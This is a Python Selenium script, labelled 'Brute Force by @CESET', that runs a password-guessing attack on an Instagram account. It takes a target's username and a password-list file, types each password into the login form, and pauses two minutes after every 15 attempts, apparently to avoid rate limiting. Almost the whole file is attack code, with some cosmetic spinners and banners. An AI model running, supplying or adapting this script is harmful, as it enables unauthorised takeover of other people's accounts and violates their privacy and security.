from selenium import webdriver

import time

import os

from colorama import init,Fore,Back,Style

init()

print(Fore.LIGHTBLACK_EX + 'Brute Force by @CESET')

time.sleep(5)

os.system('cls')

print(Fore.YELLOW + 'Account username or email or phone number')

username = input('>')

print(Fore.RED + '!!succesffully saved!!')

time.sleep(2)

os.system('cls')

print(Fore.YELLOW + 'pass list addres')

passlist = input('>')

print(Fore.RED + '!!succesffully saved!!')

time.sleep(2)

os.system('cls')

print(Fore.LIGHTGREEN_EX + 'STARTING...')

time.sleep(2)

os.system('cls')

n = 0 

for i in (range(101)) :

    print(' \ ' ,n)

    time.sleep(0.05)

    os.system('cls')

    print(' | ' ,n)

    time.sleep(0.05)

    os.system('cls')

    print(' / ' ,n)

    time.sleep(0.05)

    os.system('cls')

    print(' — ' ,n)

    time.sleep(0.05)

    os.system('cls')

    n += 1

print(Fore.RED + "DON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\nDON'T CLOSE THIS WINDOW\n")

time.sleep(1)

os.system('cls')

driver = webdriver.Firefox ()

driver.get('https://www.instagram.com/')

time.sleep(5)

namesure = driver.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[1]/div/label/input')

passww = driver.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[2]/div/label/input')

bttn = driver.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]')

a = 0

dosya = open(passlist,'r+')

for i in dosya :

    if a == 15 : 

        y = 0 

        print (Fore.CYAN + '!!2 MIN BREAK UP!!')

        for y in (range(121)) :

            print(y)

            time.sleep(1)

            os.system('cls')

        a = 0

    ı = 15 - a 

    print(Fore.GREEN + 'remaining trial => ' , ı )

    print(Fore.LIGHTRED_EX + 'Now Trying => ' , i)

    namesure.send_keys(username)

    passww.send_keys(i)

    time.sleep(2)

    bttn.click()

    time.sleep(2)

    namesure.clear()

    passww.clear()

    os.system('cls')

    a = a + 1